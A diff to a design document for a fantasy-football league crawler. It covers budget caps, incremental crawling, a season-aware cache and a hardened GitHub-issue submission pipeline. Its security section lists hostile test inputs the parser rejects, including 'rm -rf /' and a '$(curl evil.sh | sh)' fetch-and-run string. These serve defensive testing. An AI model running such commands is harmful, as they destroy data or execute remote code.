@@ -90,17 +90,172 @@ on a free read-only API costs nothing but wall time.
 
 ### 2.4 Therefore: explicit caps, always
 
-| Cap | Flag | Default | What it bounds |
+| Cap | Flag | Daily job | What it bounds |
 |---|---|---|---|
-| Depth | `--max-hops` | 2 | hops out from the seeds |
-| Leagues | `--max-leagues` | 12 | leagues added per run |
-| Calls | `--max-calls` | 400 | total Sleeper calls per run |
-| Pace | `--min-delay` | 0.12 s | minimum gap between call starts |
+| Depth | `--max-hops` | 2 | hops out **per run**, from the current frontier |
+| Scored | `--max-leagues` | 40 | leagues scored per run |
+| Queued | `--max-discover` | 150 | new dynasty leagues added to the queue per run |
+| Calls | `--max-calls` | 3000 | total Sleeper calls per run |
+| Discovery | `--max-discovery-calls` | 300 | sub-cap so discovery cannot spend the run |
+| Wall clock | `--max-seconds` | 1200 | how long a daily job may take |
+| Pace | `--min-delay` | 0.15 s | minimum gap between call starts |
+| Cache size | `--max-cache-mb` | 512 | stops *adding* to the cache; serving continues |
+
+Three of these bound genuinely different risks and none can substitute for
+another:
+
+* `--max-calls` bounds **politeness** toward a free API.
+* `--max-discovery-calls` bounds **breadth**. Discovery is cheap per call but
+  unbounded in fan-out: every league leads to ~12 users and every user to all
+  of their leagues. Without its own ceiling, a wide frontier spends the entire
+  budget before a single league is scored — a crawl that discovers forever and
+  indexes nothing.
+* `--max-seconds` bounds **wall clock**, so a daily job stays daily even if
+  Sleeper is slow.
 
 Every run reports the budget it consumed, and the consumption is committed
-into the artifact (`budget` block). `tests/test_crossleague.py` asserts that
-all four caps remain configurable, so a future edit cannot quietly remove a
-bound.
+into the artifact (`budget` block). `tests/test_crossleague.py` asserts the
+caps remain configurable; `tests/test_crossleague_growth.py` asserts they are
+*enforced*, by driving the call path 500 times against a cap of 7 and counting
+how many times the transport was actually reached. That distinction matters:
+"configurable" is a property of the interface, "cannot be exceeded" is a
+property of the behaviour, and only the second one protects Sleeper.
+
+### 2.5 Incremental: the crawl resumes rather than repeats
+
+The first build of this corpus had a structural problem that no amount of
+budget would have fixed. Each run started from the seed registry, walked two
+hops, scored what it found, and threw away everything it had learned. The next
+day it walked the same graph to the same five leagues and spent the same 600
+calls. **The corpus could not grow, because it kept buying the same data.**
+
+Two committed artifacts fix that.
+
+`data/cross_league/crawl_state.json` (`dynasty.crawl_state`) holds:
+
+* the **frontier** — leagues discovered but not yet expanded,
+* the **examined sets** — leagues and users already walked, so they are never
+  re-walked,
+* the **scoring ledger** — which leagues have been scored, when, and whether
+  it worked.
+
+Hops are counted **per run from the current frontier**, not from the seeds. A
+league parked at hop 2 today is expanded as a hop-0 entry tomorrow, so reach
+grows by `--max-hops` every day instead of being permanently capped at
+`--max-hops` from the seed — without ever issuing a large burst.
+
+Scoring order is the other half. `plan_scoring` spends a reserved share of the
+budget (`--new-league-share`, 0.7 in CI) on leagues **never scored before**,
+then refreshes the stalest indexed ones with what is left. A run that spent
+everything refreshing what it already had would be an expensive no-op.
+
+Failures are recorded as attempts, not skipped. A permanently unreadable
+league would otherwise sit at the front of the "never scored" queue and be
+retried first on every single run — which is how a crawl gets stuck.
+
+**Losing this file is survivable, and that is by design.** Every league ever
+confirmed dynasty is *also* written to the seed registry (§9.2), so a cold
+start re-reaches all of them at one call each. What is lost is the frontier:
+reach into leagues found but not yet expanded. A cost, not a corruption.
+
+### 2.6 The permanent cache: not paying twice
+
+Discovery is cheap. Scoring is not. A single four-season dynasty chain costs
+roughly:
+
+```
+4 x ( league + users + rosters + drafts + draft picks
+      + 19 transaction weeks + up to 18 matchup weeks )  ~= 160 calls
+```
+
+Measured on the live API: **99 discovery calls found 500 dynasty leagues.**
+Scoring those 500 would cost on the order of 80,000. Discovery was never the
+bottleneck; re-scoring was.
+
+So `scripts/js/sleeper_disk_cache.js` keeps completed seasons forever. One
+rule decides what qualifies:
+
+> A response is immutable **iff** the league season it belongs to is strictly
+> older than the season Sleeper's own `/state/nfl` reports as current.
+
+That is the same judgement the shipped page already makes — `knownPast` in
+`msFetchTransactions` / `msFetchMatchups` marks exactly these responses
+immutable in `sessionStorage`. This is that cache made durable and shared
+across runs, not a second opinion about what is safe to keep.
+
+It **fails closed** in every direction, because the dangerous failure here is
+not a miss — it is a hit that should have been a miss, serving week-3 data in
+week 14 while looking completely normal:
+
+| Situation | Behaviour |
+|---|---|
+| `/state/nfl` unreadable | cache nothing — "current" is unknown |
+| League season unknown | cache nothing for that league |
+| Season ≥ current | cache nothing; never pin an in-progress season |
+| Bundle on disk not strictly past | discarded on load, not served |
+| Non-2xx response | not cached; one bad day must not become permanent |
+| `/user/...`, `/state/nfl` | never cached; membership and the live week change |
+
+The last row of the first block is what makes the **NFL season rollover** safe
+with no migration: last year's "past" bundle becomes this year's "not strictly
+past" and is dropped automatically.
+
+**Layout.** `data/cross_league/cache/<league_id>.json.gz`, one bundle per
+league *season* — a Sleeper league id is already season-scoped, since a
+dynasty chain is a linked list of one league id per season, so the key
+`(league_id, season, week)` collapses to `bundle(league_id) → entries[url]`.
+The season is stored inside the bundle anyway, because a key you cannot audit
+is a key you cannot trust. Draft picks carry no league in their URL, so
+`cache/drafts.json` maps `draft_id → league_id`.
+
+Raw response **text** is stored, never a re-serialised object, so what the
+scorer parses on a hit is byte-identical to what it parsed on the miss.
+
+**Ordering inside `instrumentedFetch` is load-bearing:**
+
+```
+local artifact  ->  disk cache  ->  budget check  ->  network
+```
+
+The cache is consulted *before* the budget. A league whose history is already
+on disk must stay scorable when the budget is nearly spent, because serving it
+costs Sleeper nothing. Swapping those two lines would make the cache useless
+in exactly the situation it exists for, and it is the kind of change that
+looks like tidying — so `tests/test_crossleague_growth.py` asserts the order.
+
+A cache hit is **not** a call: it does not touch the network, does not consume
+budget, and does not count toward the rate limit. It also must not set
+`leagueRefused` — the harness discards any league that had a refused call, so
+a hit that looked like a refusal would make the cache *shrink* the corpus.
+That is asserted too.
+
+**Size.** ~235 KB raw per past league-season, ~63 KB on disk gzipped
+(measured: 55,468 bytes of real transaction + matchup JSON → 9,609, 5.8x).
+Write-once and never rewritten. `--max-cache-mb` stops additions past a
+ceiling while continuing to serve what is already there.
+
+### 2.6.1 Why the cache is NOT committed
+
+Every other durable artifact here is committed, so this one being gitignored
+is a deliberate exception with two reasons:
+
+1. **It is raw third-party data.** Caching Sleeper's responses to avoid
+   hammering a free API is ordinary good behaviour. Committing ~24 MB of
+   verbatim transaction logs and box scores into a public repository is
+   republishing Sleeper's data, which is a different act, and one this
+   project has no need to perform. §2.2 already commits us to treating their
+   terms as a live constraint rather than a formality.
+2. **It is regenerable, and losing it cannot cost a league.** The *scores*
+   live in the `retained` block of `corpus.json`, which is committed. An
+   evicted cache means one slower crawl, not a smaller corpus.
+
+In CI it is restored by `actions/cache`, alongside `data/pfr_cache` and
+`data/sr_cache`, which are gitignored for exactly the same reason. The daily
+schedule keeps it inside the 7-day eviction window.
+
+This is the one place where "the site is static, so a committed file is the
+only durable storage" does **not** apply — because this artifact does not
+need to be durable, only warm.
 
 ---
 
@@ -430,6 +585,132 @@ Adding crawl seeds to `leagues.json` would publish a per-league page for every
 seed and pollute the league picker with leagues nobody on this site asked to
 see. **Kept separate on purpose.**
 
+### 9.2 The registry is the durable floor on coverage
+
+`--update-seeds` writes every confirmed dynasty league back into the registry.
+That is what makes coverage monotone: crawl state can be lost, corrupted,
+reset or rolled over at a new season, and none of that costs a league, because
+the registry is a hand-editable file that only an explicit edit shrinks.
+
+Only leagues Sleeper itself confirmed as `settings.type == 2` are written, so
+the registry cannot accumulate ids that every future crawl would discard.
+Hand-written `note` fields and `_comment` keys are preserved on rewrite — an
+operator's reason for adding a seed is not ours to overwrite.
+
+---
+
+## 9.5 Submissions: getting a league in from a static site
+
+### 9.5.1 The honest problem
+
+The owner's ask was that the board populate with "every league entered into
+the tool". **On a static site, that cannot happen automatically, and no amount
+of front-end work changes it.**
+
+This site is a GitHub Pages build. Every page is a file. There is no server,
+no database, no API of our own and no write path of any kind. When a visitor
+types a league id into the Manager Score page, that id is read by JavaScript
+in *their* browser, used to call Sleeper from *their* machine, and rendered
+for *them*. Nothing about it reaches us — not in a log, not in a queue, not
+anywhere. Adding a "submit your league" text box to the page would produce a
+form that silently discards input, which is worse than not having one.
+
+So the gap is closed as far as it genuinely can be, and the remainder is
+stated rather than papered over.
+
+### 9.5.2 What is implemented
+
+The one inbox a static site can point an anonymous visitor at is a GitHub
+issue, and the one writable store in the system is this repository — which the
+daily workflow already writes to.
+
+```
+crossleague.html renders a link
+  -> visitor opens a pre-filled issue form
+  -> .github/workflows/league-submissions.yml fires on the `issues` event
+  -> scripts/ingest_league_submissions.py reads open issues with the label
+  -> validates the id against Sleeper
+  -> appends to data/cross_league/seeds.json, comments, closes the issue
+  -> the next daily crawl picks it up from the registry
+```
+
+The label is declared by the **issue template**, not by a `?labels=` query
+parameter on the link. That parameter only works for users with write access
+to the repository; for a visitor it is dropped or errors. Since the submitters
+are by definition not collaborators, a template-declared label is the only
+version that works — and the page test asserts the link uses `?template=`
+rather than `?labels=`.
+
+The ingest job is scheduled at 10:00 UTC and the crawl at 11:00, so a
+submission accepted on the sweep is already in the registry when the crawl
+runs.
+
+### 9.5.3 Why this is safe
+
+Issue bodies are attacker-controlled text from strangers, reaching a job that
+holds a write-scoped token. Every item below is a deliberate property, and
+each has a test in `tests/test_crossleague_growth.py`:
+
+1. **Nothing from an issue is executed.** No shell, no `subprocess`, no
+   `eval`, no template expansion. A test strips comments and string literals
+   from the script and asserts none of those names appear in the remaining
+   *code* — so the guarantee cannot be satisfied by a promise in a docstring.
+2. **Only digits survive parsing.** `extract_league_id` is the entire trust
+   boundary and may return exactly one thing: `^[0-9]{6,24}$`, or nothing.
+   Tested against `123; rm -rf /`, `$(curl evil.sh | sh)`, backticks,
+   `${{ secrets.GITHUB_TOKEN }}`, `<script>`, path traversal and SQL.
+3. **Ambiguity is refused, not guessed.** Two candidate ids in one body is a
+   rejection; picking one would make the outcome depend on text ordering the
+   submitter did not know was significant.
+4. **The id must be real.** Sleeper must return an existing league with
+   `sport == nfl` and `settings.type == 2`. A well-formed id is not enough,
+   and an unreachable Sleeper **fails closed**.
+5. **Nothing else from the issue is stored.** The league's name comes from
+   *Sleeper's* response, never the issue title or body, so a submitter cannot
+   inject display text into the registry or the site.
+6. **Bounded work.** `--max-issues 25` per run, one league id per issue.
+7. **No injection sink in the workflow.** `${{ github.event.issue.body }}` is
+   never interpolated into a `run:` block — that is the classic vulnerability
+   in exactly this kind of workflow. The script reads the GitHub API itself,
+   so no shell ever sees a submitter's string. Asserted against the YAML with
+   comments stripped.
+8. **Not `pull_request_target`.** That is the trigger that hands write-scoped
+   credentials to a fork's code. `issues` events run from the default branch
+   and check out no untrusted code.
+9. **Least privilege.** `contents: write` and `issues: write`, nothing else,
+   no secrets beyond the automatic `GITHUB_TOKEN`, and no dependency install —
+   the script is stdlib-only, so no third-party code runs in a job holding
+   that token.
+10. **Accepting is not scoring.** An accepted id goes through the same crawl,
+    the same dynasty filter and the same partial-read discard as any other
+    league. A bad id that somehow got through yields no score, not a wrong one.
+11. **Auditable and revertible.** `git log data/cross_league/seeds.json` shows
+    every accepted id with the issue number that introduced it; removing one
+    is a one-line revert.
+
+### 9.5.4 The residual risk, stated rather than engineered around
+
+Someone can submit a real dynasty league **they are not in**. No API can
+distinguish that, so it is handled socially: the issue form says to submit
+only your own league, the registry records which issue introduced it, and
+removal is a revert. This is a limitation, not a solved problem.
+
+### 9.5.5 What remains genuinely impossible
+
+* **Automatic indexing from page use.** Typing a league id into the Manager
+  Score page cannot add it here. That page runs in the visitor's browser and
+  has no path to the corpus; only a job running in CI can write to it. A
+  deliberate submission step is not a UX shortcoming, it is the boundary of
+  what a static site is.
+* **Instant indexing.** Submission is cheap; scoring is ~160 calls. A new
+  league joins a queue and appears within a few daily runs.
+* **Private leagues.** Sleeper's public API is all this reads. Anything it
+  will not serve unauthenticated is not indexable, and this project will not
+  authenticate to get around that.
+* **A census of Sleeper.** Submissions widen the seed set, which is the *only*
+  thing that reaches leagues outside the existing social neighbourhood — but
+  the result is still a convenience sample, and the page says so.
+
 ---
 
 ## 10. Verification status
@@ -450,6 +731,60 @@ see. **Kept separate on purpose.**
 * That compacting the retained block is lossless for aggregation: the
   leaderboard and draft board are byte-identical before and after, at 13x
   smaller (1.57 MB → 118 KB).
+
+**Verified for the growth work (§2.5, §2.6, §9.5), all against the live API:**
+
+* **Discovery is cheap, scoring is not.** One real discovery pass found
+  **500 dynasty leagues in 99 calls** (~0.2 calls per league). Scoring those
+  same leagues costs ~160 calls each. That asymmetry is the whole reason the
+  crawl is incremental rather than just bigger.
+* **Corpus growth, end to end.** 5 → **110 dynasty leagues**, 56 → **1,283
+  managers**, 21 → **510 league-seasons**. 188 managers (15.4%) now appear in
+  2+ indexed leagues, one in 33 — so cross-league aggregation has real
+  cross-league evidence to work with rather than being an aggregation of one.
+* **The permanent cache, measured twice.** Same four leagues, cold then warm:
+  **313 calls / 66 s → 107 calls / 6.3 s** (66% fewer calls, 10x faster). At
+  corpus scale a steady-state daily run scored 12 leagues in **22.6 s using
+  316 calls while serving 2,012 cache hits free** — 2,328 logical reads for
+  316 actual ones, an **86% reduction**.
+* **Resumption across runs.** Run 1 scored 60 leagues and left 440 queued;
+  run 2 resumed and planned "40 new + 60 refresh", ending at 100 scored /
+  400 queued; run 3 resumed again to 109 scored / 391 queued. Each run
+  continued the walk rather than repeating it, which is the behaviour the
+  first build did not have.
+* **The budget held every time.** Across all runs: **0 calls refused over
+  budget, 0 network errors.** The largest run used 9,372 of a 9,600 cap.
+  Pacing measured at ~430 calls/minute against Sleeper's published guidance
+  of under 1,000.
+* **The cache cannot serve an in-progress season.** Decision table asserted
+  against fixtures in `tests/js/sleeper_cache_tests.js` (27 checks), including
+  the season-rollover self-heal and the fail-closed paths.
+* **Issue submissions cannot inject.** `extract_league_id` asserted against
+  shell metacharacters, command substitution, backticks, workflow
+  interpolation, `<script>`, path traversal and SQL; the workflow asserted to
+  contain no `${{ github.event.issue.* }}` sink and no `pull_request_target`.
+
+**Found and fixed while verifying — the actual "no data" bug:**
+
+The harness served `managerscore_values.json` but not
+`managerscore_series.json`. `msGetJSONSoft` turns a 404 into `null`, so
+`MSX.series` was null on every crawl and `msCapture` answered "no value
+  recorded on or before this date" for **every asset in every league**. The
+crawl succeeded, every league scored, the artifact validated and the page
+rendered — with every component at `n=0` and every manager at exactly index
+100. Measured on one real league, before → after:
+
+| | evaluable | tooRecent | offBoard | scores |
+|---|---|---|---|---|
+| before | **0** | 49 | 752 | all exactly 100 |
+| after | **447** | 88 | 266 | 100.8 – 116.5 |
+
+Corpus-wide the draft board went from **0 rows to 838**. Nothing failed
+loudly, which is why it shipped: an empty corpus is shape-identical to a
+corpus of very inactive leagues. The harness now **refuses to publish** when
+the series is absent, and `tests/test_crossleague_growth.py` asserts both the
+refusal and that the committed corpus contains at least one non-zero
+component.
 * Aggregation maths, lineage de-duplication, persistence degradation, coverage
   phrasing and the privacy key-set, by stdlib tests.
 * Renderer behaviour and HTML escaping, in node against a stub DOM.
@@ -460,10 +795,26 @@ see. **Kept separate on purpose.**
 
 * **Rendering.** There is no browser in the build environment. The page's
   *logic* is asserted against a stub DOM; how it **looks** is unconfirmed by
-  eye.
+  eye. The coverage banner, the queue line and the submission link are
+  asserted as strings and as DOM writes, never as pixels.
 * **Whether the workflow can actually commit** (§7.2) — repo-level Actions
   permission is unreadable with the available token, and the existing
   commit-back path has never executed.
+* **The submission path end to end.** Every part is tested against fixtures
+  — parsing, validation, registry append, workflow shape — but **no real
+  issue has been filed and ingested**. Doing so would require opening an
+  issue on the live repository and letting a workflow that does not yet exist
+  on `main` act on it. The first real submission is therefore the first live
+  exercise of the label → ingest → commit → close loop.
+* **Whether `actions/cache` retains the Sleeper cache in practice** (§2.6.1).
+  The eviction behaviour is documented GitHub behaviour, not something
+  observed here. If it does not hold, the cost reduction degrades toward the
+  cold numbers; the corpus does not shrink.
 * **Corpus representativeness.** A social-graph walk from one seed reaches
   leagues socially near that seed. The sample is not random and no claim is
-  made that it is.
+  made that it is. Submissions are the only mechanism that can reach a
+  disconnected part of the graph, and they depend on people choosing to use
+  them.
+* **That 400 queued leagues will ever be fully indexed.** At ~13 new leagues
+  per daily run the current queue is roughly a month of crawling, assuming
+  discovery adds nothing further — which it will.
